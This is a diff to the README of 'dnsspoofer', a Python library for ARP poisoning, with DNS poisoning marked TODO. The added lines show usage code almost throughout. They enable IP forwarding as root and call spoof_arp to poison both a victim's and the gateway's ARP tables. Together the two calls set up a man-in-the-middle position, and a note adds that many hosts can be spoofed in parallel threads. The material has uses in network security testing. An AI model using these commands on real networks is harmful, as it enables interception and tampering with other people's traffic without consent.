@@ -14,11 +14,17 @@ python setup.py install  # or add dnsspoofer.so to the PYTHONPATH
 ```
 
 ### Usage
-
+```bash
+sudo sh -c 'echo 1 > /proc/sys/net/ipv4/ip_forward'
+sudo python  # dnsspoofer requires root privileges
+```
 #### ARP poisoning
 ```python
-sudo python  # dnsspoofer requires root privileges
 import dnsspoofer
+
+# module documentation is available by:
+# help(dnsspoofer)
+
 # your mac addr:
 # 33:33:33:33:33:33
 # example arp -n output:
@@ -29,7 +35,16 @@ import dnsspoofer
 dnsspoofer.spoof_arp(b"\x01\x02\x03\x04\x05\x06",b"192.168.1.1")
 # now arp -n output on the victim machine:
 # 192.168.1.1     ether   33:33:33:33:33:33   C  em1
+
+# you probably also want to spoof the victim's (192.168.1.100)
+# mac address on the gateway
+dnsspoofer.spoof_arp(b"\x10\x20\x30\x40\x50\x60",b"192.168.1.100")
 ```
 
 #### DNS poisoning
 TODO
+
+
+#### Notes
+* dns-spoofer is releasing the GIL while doing it's magic. So you shouldn't have any problems with using multiple threads to
+periodically spoof multiple hosts.
